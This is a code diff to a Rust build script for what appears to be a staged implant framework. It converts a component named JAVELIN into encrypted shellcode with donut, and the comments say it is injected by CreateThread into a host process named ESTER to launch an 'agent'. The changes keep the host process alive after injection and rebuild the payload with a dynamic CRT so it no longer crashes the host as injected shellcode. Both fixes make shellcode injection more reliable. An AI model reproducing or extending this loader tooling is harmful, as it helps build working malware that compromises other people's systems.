@@ -56,7 +56,11 @@ fn convert_exe_to_shellcode(exe_path: &Path, output_path: &Path) -> Result<Vec<u
     // Run donut to convert EXE to shellcode
     // -a 2 = amd64 only (our target)
     // -f 1 = binary format
-    // -x 2 = exit process when done (safer for nested shellcode)
+    // -x 1 = ExitThread (NOT ExitProcess) when JAVELIN finishes.
+    //        CRITICAL: JAVELIN runs inside ESTER's process via CreateThread.
+    //        Using -x 2 (ExitProcess) would kill ESTER immediately after JAVELIN
+    //        launches the agent, destroying the host process while the agent
+    //        is still mid-execution. -x 1 exits only the donut thread.
     // -e 3 = entropy + encryption
     // -t = Create new thread for loader (important for stability)
     let output = Command::new(donut_exe)
@@ -65,7 +69,7 @@ fn convert_exe_to_shellcode(exe_path: &Path, output_path: &Path) -> Result<Vec<u
             "-o", &output_path.to_string_lossy(),
             "-a", "2",   // x64 only
             "-f", "1",   // binary format
-            "-x", "2",   // exit process when done
+            "-x", "1",   // ExitThread only (keep ESTER host process alive)
             "-e", "3",   // entropy + encryption
             "-t",        // create new thread for loader
         ])
@@ -227,8 +231,24 @@ fn build_javelin_lite(config: &StageConfig) -> Result<Vec<u8>, Box<dyn std::erro
     }
     args.extend(&["--features", features]);
 
+    // CRITICAL: crt-static MUST NOT be used for JAVELIN.
+    //
+    // The workspace .cargo/config.toml sets `target-feature=+crt-static` for all
+    // x86_64-pc-windows-msvc release builds. Cargo MERGES rustflags arrays across
+    // config files, so stages/javelin/.cargo/config.toml's `rustflags = []` does
+    // NOT cancel the workspace flag — it just contributes nothing to the merge.
+    //
+    // When JAVELIN (compiled with static CRT) runs as raw shellcode injected into
+    // ESTER, the CRT startup sequence (__security_init_cookie, TLS init, etc.)
+    // tries to access PE-loader infrastructure that doesn't exist in the shellcode
+    // context → abort() → exception 0xC0000409 → ESTER process dies.
+    //
+    // Setting RUSTFLAGS="" via the environment variable OVERRIDES and REPLACES
+    // the config.toml rustflags (env var wins over config files in Cargo), so
+    // JAVELIN is built with dynamic CRT which works correctly in shellcode.
     let status = Command::new("cargo")
         .args(&args)
+        .env("RUSTFLAGS", "")
         .status()?;
 
     if !status.success() {
